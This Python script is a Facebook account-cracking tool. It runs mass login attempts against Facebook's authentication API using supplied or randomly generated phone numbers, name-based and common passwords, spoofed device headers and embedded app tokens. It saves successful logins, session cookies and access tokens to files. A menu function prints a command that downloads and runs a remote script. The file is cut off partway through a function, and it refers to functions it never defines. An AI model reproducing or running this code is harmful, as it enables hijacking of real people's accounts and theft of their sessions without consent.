import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp


try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	#os.system("python dilute")

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)

from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

def line():
	print(51*'-')

def p(x):
	print(x)

#___________ [ Lists Used in Script]________

id = []
ok = []
cp = []
loop = 0
method=[]
#SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
SEX = f"{random.choice(['Liger', 'METERED', 'MOBILE.EDGE', 'MOBILE.HSPA', 'MOBILE.LTE', 'MODERATE', 'Fiber', 'DSL', 'Satellite', 'Dial-up', 'Fixed Wireless', 'Cable', 'WiMAX'])}"
ses = requests.Session()
def logo():
	os.system('clear')
	logo = ("""\33[;33m            
\033[92m
   
 ...    :::.        :    :::.    :::::::..   
 ;;     ;;;;;,.    ;;;   ;;`;;   ;;;;``;;;;  
[['     [[[[[[[, ,[[[[, ,[[ '[[,  [[[,/[[['  
$$      $$$$$$$$$$$"$$$c$$$cc$$$c $$$$$$c    
88    .d888888 Y88" 888o888   888,888b "88bo,
 "YmmMMMM""MMM  M'  "MMMYMM   ""` MMMM   "W" 
                                      
[<>] The Original Codes are Written by Umar Nazeer 
---------------------------------------------------
 ╰◈▪➣ Github    : https://github.com/CyberAttack 
 ╰◈▪➣ Facebook  : https://www.facebook.com/InnocentUmarr
 ╰◈▪➣ Author    : ★彡[ᴜᴍᴀʀ ɴᴀᴢᴇᴇʀ]彡★ 
 ╰◈▪➣ Version   : Version [10.5]
 ╰◈▪➣   \033[1;96m★彡[ɪᴍʀᴀɴ ᴋʜᴀɴ ʟᴏᴠᴇʀ]彡★\033[1;97m
-------------------------------------------------- 
\033[1;97m""")  
	p(logo)
def clear():
	os.system("clear")


uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""

bumper = f'{id}{xp}'

def connection_token():
	 digits_count = 16
	 letters_count = 16
	 letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	 digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	 # Convert resultant string to list and shuffle it to mix letters and digits
	 sample_list = list(letters + digits)
	 random.shuffle(sample_list)
	 # convert list to string
	 final_string = ''.join(sample_list)
	 return final_string

#method1
yahe ='[FBAN/Orca-Android;FBAV/8.0.288.520;FBPN/com.facebook.orca;FBDV/CPH5000;FBBV/MMB29M;FBLC/fr_CH;FBBV/935785965;FBMF/oppo;FBBD/oppo;FBDV/CPH5000/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/8.0.288.520;FBCR/Zong;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/1;FBCK/gps;FBSN/815958642;FBSF/9190641884;FBRV/vector60;FBDR/15]','[FBAN/Orca-Android;FBAV/8.0.500.938;FBPN/com.facebook.orca;FBDV/CPH1933;FBBV/LMY47V;FBLC/fr_CH;FBBV/192264842;FBMF/oppo;FBBD/oppo;FBDV/CPH1933/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/8.0.500.938;FBCR/Zong;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/o;FBCK/gps;FBSN/314376748;FBSF/1225293595;FBRV/vector65;FBDR/64]','[FBAN/Orca-Android;FBAV/13.0.606.508;FBPN/com.facebook.orca;FBDV/CPH5000;FBBV/JZO54K;FBLC/fr_CH;FBBV/821066385;FBMF/oppo;FBBD/oppo;FBDV/CPH5000/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/13.0.606.508;FBCR/Mobilink;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/n;FBCK/gps;FBSN/702056395;FBSF/5906822770;FBRV/vector41;FBDR/112]','[FBAN/Orca-Android;FBAV/10.0.808.171;FBPN/com.facebook.orca;FBDV/OPPO;FBBV/CPH5000;FBLC/fr_CH;FBBV/492150501;FBMF/oppo;FBBD/oppo;FBDV/OPPO/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/10.0.808.171;FBCR/Ufone;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/r;FBCK/gps;FBSN/359219887;FBSF/1035994077;FBRV/vector86;FBDR/116]','[FBAN/Orca-Android;FBAV/4.0.626.208;FBPN/com.facebook.orca;FBDV/CPH2201;FBBV/KOT49H;FBLC/fr_CH;FBBV/546660061;FBMF/oppo;FBBD/oppo;FBDV/CPH2201/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/4.0.626.208;FBCR/Mobilink;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/d;FBCK/gps;FBSN/255034067;FBSF/8693450344;FBRV/vector47;FBDR/206]','[FBAN/Orca-Android;FBAV/6.0.488.602;FBPN/com.facebook.orca;FBDV/CPH2215;FBBV/KOT49H;FBLC/fr_CH;FBBV/122992602;FBMF/oppo;FBBD/oppo;FBDV/CPH2215/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/6.0.488.602;FBCR/Warid;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/d;FBCK/gps;FBSN/167401303;FBSF/1981577492;FBRV/vector4;FBDR/338]','[FBAN/Orca-Android;FBAV/12.0.186.604;FBPN/com.facebook.orca;FBDV/CPH1909;FBBV/NRD90M;FBLC/fr_CH;FBBV/343255518;FBMF/oppo;FBBD/oppo;FBDV/CPH1909/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/12.0.186.604;FBCR/Ufone;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/.;FBCK/gps;FBSN/741872150;FBSF/1822330415;FBRV/vector63;FBDR/351]','[FBAN/Orca-Android;FBAV/6.0.833.350;FBPN/com.facebook.orca;FBDV/CPH5000;FBBV/MMB29M;FBLC/fr_CH;FBBV/222731930;FBMF/oppo;FBBD/oppo;FBDV/CPH5000/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/6.0.833.350;FBCR/Ufone;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/4;FBCK/gps;FBSN/852597670;FBSF/9991536991;FBRV/vector1;FBDR/225]','[FBAN/Orca-Android;FBAV/5.0.808.651;FBPN/com.facebook.orca;FBDV/OPPO;FBBV/CPH1920;FBLC/fr_CH;FBBV/614103678;FBMF/oppo;FBBD/oppo;FBDV/OPPO/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/5.0.808.651;FBCR/Telenor;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/.;FBCK/gps;FBSN/498410227;FBSF/9901007838;FBRV/vector23;FBDR/23]','[FBAN/Orca-Android;FBAV/9.0.375.582;FBPN/com.facebook.orca;FBDV/CPH1933;FBBV/LMY47V;FBLC/fr_CH;FBBV/359739102;FBMF/oppo;FBBD/oppo;FBDV/CPH1933/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/9.0.375.582;FBCR/Mobilink;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/o;FBCK/gps;FBSN/150099403;FBSF/4494716723;FBRV/vector61;FBDR/340]','[FBAN/Orca-Android;FBAV/4.0.192.179;FBPN/com.facebook.orca;FBDV/CPH2201;FBBV/KOT49H;FBLC/fr_CH;FBBV/154879355;FBMF/oppo;FBBD/oppo;FBDV/CPH2201/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/4.0.192.179;FBCR/Mobilink;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/d;FBCK/gps;FBSN/495047802;FBSF/8986072725;FBRV/vector49;FBDR/348]','[FBAN/Orca-Android;FBAV/9.0.184.345;FBPN/com.facebook.orca;FBDV/CPH1920;FBBV/JZO54K;FBLC/fr_CH;FBBV/260348059;FBMF/oppo;FBBD/oppo;FBDV/CPH1920/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/9.0.184.345;FBCR/Warid;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/ ;FBCK/gps;FBSN/381259185;FBSF/8851513612;FBRV/vector67;FBDR/359]','[FBAN/Orca-Android;FBAV/7.0.659.715;FBPN/com.facebook.orca;FBDV/CPH1609;FBBV/KOT49H;FBLC/fr_CH;FBBV/932731941;FBMF/oppo;FBBD/oppo;FBDV/CPH1609/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/7.0.659.715;FBCR/Ufone;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/i;FBCK/gps;FBSN/289545129;FBSF/5741491375;FBRV/vector43;FBDR/32]','[FBAN/Orca-Android;FBAV/9.0.239.849;FBPN/com.facebook.orca;FBDV/CPH1933;FBBV/NMF26X;FBLC/fr_CH;FBBV/455557522;FBMF/oppo;FBBD/oppo;FBDV/CPH1933/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/9.0.239.849;FBCR/Mobilink;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/r;FBCK/gps;FBSN/885245778;FBSF/2679944185;FBRV/vector71;FBDR/205]','[FBAN/Orca-Android;FBAV/12.0.733.356;FBPN/com.facebook.orca;FBDV/CPH1933;FBBV/LRX22C;FBLC/fr_CH;FBBV/752936294;FBMF/oppo;FBBD/oppo;FBDV/CPH1933/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;FBSV/12.0.733.356;FBCR/Warid;FBAP/350685531728;FBVS/1.2.0;FBVL/3;FBBT/release;FBCR/8;FBCK/gps;FBSN/936106900;FBSF/6220938199;FBRV/vector67;FBDR/157]'

def uaa():
    app_versions = [ '196.0.0.29.99', '200.0.0.30.105', '180.0.0.24.82',
        '210.0.0.35.120', '220.0.0.40.150', '230.0.0.45.180']  # Add more versions if needed
    locales = ['en_US', 'th_TH', 'es_ES', 'fr_FR', 'de_DE', 'it_IT', 'ja_JP', 'ko_KR', 'ru_RU',
        'pt_BR', 'zh_CN', 'ar_SA', 'hi_IN', 'tr_TR', 'nl_NL', 'id_ID', 'pl_PL', 'sv_SE',
        'no_NO', 'da_DK', 'fi_FI', 'hu_HU', 'cs_CZ', 'el_GR', 'he_IL', 'vi_VN', 'ro_RO',
        'bg_BG', 'hr_HR', 'sr_RS', 'sk_SK', 'sl_SI', 'et_EE', 'lv_LV', 'lt_LT', 'uk_UA']  # Add more locales if needed
    carriers = ['null', 'AIS', 'Verizon', 'Vodafone']  # Add more carriers if needed
    manufacturers = ['samsung']  # Add more manufacturers if needed
    android_versions = ['6.0.0' , '7.0.0', '8.0.0', '9.0.0', '10.0.0']  # Add more Android versions if needed
    cpu_architectures = ['armeabi-v7a', 'arm64-v8a']  # Add more CPU architectures if needed
    screen_densities = ['3.0', '2.0', '4.0']  # Add more screen densities if needed

    user_agent = (
        f"FBAN/Orca-Android;FBAV/{random.choice(app_versions)};"
        f"FBPN/com.facebook.orca;FBLC/{random.choice(locales)};"
        f"FBBV/{random.randint(100000000, 999999999)};"
        f"FBCR/{random.choice(carriers)};FBMF/{random.choice(manufacturers)};"
        f"FBBD/{random.choice(manufacturers)};FBDV/{random.choice(['SM-A720F','SM-G5700', 'SM-G5510', 'SM-G5520', 'SM-G5528', 'SM-J710FN', 'SM-A826S'])};"
        f"FBSV/{random.choice(android_versions)};FBCA/{random.choice(cpu_architectures)};"
        f"FBDM/{{density={random.choice(screen_densities)},width=1080,height=1920}};FB_FW/1;"
    )

    return user_agent




nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class iAmMain:
	
	def __init__(self):

		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):
		logo()
		
		
		p(" [1] File Cloning ")
		p(" [2] Random Clone")
		p(" [3] Dump Tool")
		p(" [4] Pass changer ")
		p(' [W] Join Whatsapp Group ')
		p(" [A] Admin Contact ")
		line()
		opt1 = input(" {√} Select An Option : ")
		if opt1 == "1":self.file_menu()
		
		elif opt1 == "2":self.num_menu()
		elif opt1 == "4":automation().menu()
		elif opt1 == "3":Grep().links_only()
		elif opt1 == "W":os.system('xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf')
		elif opt1 == "A":os.system("xdg-open https://wa.me/+923021431324")
	  
	
	def dump_menu(self):
		 print("rm -rf dump && mkdir dump && cd dump && curl -L https://raw.githubusercontent.com/dcofficial/dump/main/dump > dump && python dump")
		
	def file_menu(self):
		logo()
		p(" 📁 : Example /sdcard/Umar.txt")
		file = input(" 📁 : Put File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
			sp(2);self.file_menu()
		
	def method_select(self,id):
		logo()
		p(" [〽️] Method 1 [ ✅ ] ")
		p(" [〽️] Method 2  ")
		p(" [〽️] Method 3  ")
		p(" [〽️] Method 4  ")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("i")
			self.password_menu(id)
		elif m_opt =="2":
			method.append('ii')
			self.password_menu(id)
		elif m_opt =="3":
			method.append('iii')
			self.password_menu(id)
		elif m_opt =="4":
			 method.append('iiii')
			 self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)

	def password_menu(self,id):
		pwx=[]
		logo()
		max = 20
		p(" [•] How Many Password Do You Want  ")
		try:
			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should undet 20 ");sp(2);self.password_menu()
		except:
			plimit = 4
		logo()
		p(" [•] Enter Your Passwords  ")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))
		logo()
		p("  Total File Accounts : %s "%(str(len(id))))
		p("  Proces has been started ")
		print('  The process is running in the background')
		print('  Use Airplane Mode For Best Result')
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					 saqi.submit(self.method4,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):
		line()
		p(" [•] Cloning Hasbeen Completed ")
		p(" [•] Cloning Accounts Saved in /sdcard")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))
		line()
		input(" [•] Press Enter To Go Back ")
		self.iAmMenu()

	def num_menu(self):
		logo()
		pwx=[]
		p(" [•] Advanced Random Cloning Tool ")
		line()
		p(" [•] Example : 0300 , 0313 , 0324 , 0342 ")
		line()
		code = input(" [•] Put Sim Code : ")
		logo()
		p(" [•] Example : 1000, 2000 , 5000 Max ")
		max = 5000
		try:
			clone_limit = int(input(" [•] Put Clone Limit : "))
			if clone_limit =="":
				clone_limit = 1000
			elif clone_limit > max:
				p(" [•] Limit Should be Under 5000 ");sp(2);self.num_menu()
		except:
			clone_limit = 1000
		for n in range(clone_limit):
			_ = random.randint(1111111,9999999)
			id.append(str(_))
		logo()
		p(" [1] Auto Password \n [2] Choice Password ")
		line()
		pwx_=[]
		pw_select = input(" [•] Choose : ")
		if pw_select == "1":
			pwx_.append("i")
		elif pw_select == "2":
			pwx_.append('ii')
			max = 10
			try:
				p_limit = int(input(" [•] Put Password Limit : "))
				if p_limit =="":
					p_limit = 5
				elif p_limit > max:
					p(" [•] Limit Should be Under 1 - 10 ");sp(2);num_menu()
			except:
				p_limit = 5
			for n in range(p_limit):
				pwx.append(input(" [•] Put Password %s : "%(n+1)))
		else:
			pwx_.append("i")
		logo()
		
		p(" [•] Total Random Accounts : %s "%(str(len(id))))
		p(" [•] Dilute Brute Has Been Started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = code+user
				if "i" in pwx_:
					pwx = [user,uid,"khan1122","khankhan","khan123","baloch","i love you","khan1234","khan12345"]
					saqi.submit(self.r_crack,uid,pwx)
				elif "ii" in pwx_:
					saqi.submit(self.r_crack,uid,pwx)
				else:
					saqi.submit(self.r_crack,uid,pwx)
		self.saved_results(ok,cp)
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [Umar] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': uaa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				#a = headers
				#print(a)

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					p('\r\033[1;92m[OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r Umar %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmMethod2Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(30000, 40000)),
'X-FB-SIM-HNI': str(random.randint(30000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': f'nid={nid};pid=Main;tid={tid};nc=1;fc=0;bc=0;cid={connection_token()}',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': connection_token()}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					token = q["access_token"]
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					open('/sdcard/UMAR_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/UMAR_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/UMAR_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method2(uid,nm,pwx)
		except Exception as e:
			self.method2(uid,nm,pwx)
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [UMAR %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmMethod3Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/UMAR_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/UMAR_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/UMAR_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [UMAR] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				params = {
					"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
					"sdk_version": f"{str(random.randint(1,26))}", 
					"email": uid,
					"locale": "en_PK",
					"password": pw,
					"sdk": "Android",
					"generate_session_cookies": "1",
					"sig": "374e60f8b9bb6b8cbb30f78030438895"
				}
				headers = {

					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": iAmMethod4Ua(),
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger",
					"Authorization":"Auth2 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
				}
				q = ses.post("https://b-graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					#print(q)
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/UMAR_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/UMAR_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/UMAR_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method4(uid,nm,pwx)
		except Exception as e:
			self.method4(uid,nm,pwx)
	def r_crack(self,uid,pwx):
